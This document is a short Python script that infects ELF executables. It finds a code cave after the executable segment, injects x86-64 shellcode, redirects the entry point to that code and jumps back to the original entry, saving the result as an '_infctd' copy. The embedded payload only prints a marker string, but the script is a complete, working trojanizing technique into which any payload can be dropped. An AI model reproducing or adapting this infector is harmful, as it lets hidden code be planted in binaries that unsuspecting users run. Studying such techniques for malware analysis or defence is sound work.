#!/usr/bin/env python3
from pwn import *
import sys
import struct
import lief

if len(sys.argv) != 2:
    print('Usage: viscr.py <binary>')
    exit(1)

e = lief.ELF.parse(sys.argv[1])
og_entry = e.header.entrypoint

'''
1. find executable segment
2. calculate cave size and cave offset from p_filesz (segment size)
'''
for i in e.segments:
    if (i.type == lief.ELF.SEGMENT_TYPES.LOAD) and (i.flags.value == 5):
        cave_off = i.virtual_address + i.physical_size + 3 # 4byte blabla
        cavesz = (i.virtual_address + i.alignment) - cave_off

#generate shellcode
payload = b"\xeb\x14\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xeb\x13\xe8\xe7\xff\xff\xff\x61\x74\x30\x6d\x31\x63\x5f\x4a\x75\x6e\x4b\x31\x65\x0a\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\x31\xf6"

if (len(payload) + 5) > cavesz:
    print("Cave is too small to place a payload")
    exit(1)

e.header.entrypoint =  cave_off
e.write("{}_infctd".format(sys.argv[1]))

elf = ELF('{}_infctd'.format(sys.argv[1]), False)
context.arch = elf.arch

print("Arch === {}".format(elf.arch))
print("Endian === {}".format(elf.endian))

print("Found cave at {} ; size - {}".format(hex(cave_off), cavesz))

#patch

jmp_addr = (og_entry 
            - (cave_off + len(payload) + 5))
jmp_back = b"\xe9" + struct.pack('<i', jmp_addr) # relative jmp
payload += jmp_back

elf.mmap[cave_off:cave_off+len(payload)] = payload
elf.save('{}_infctd'.format(sys.argv[1]))
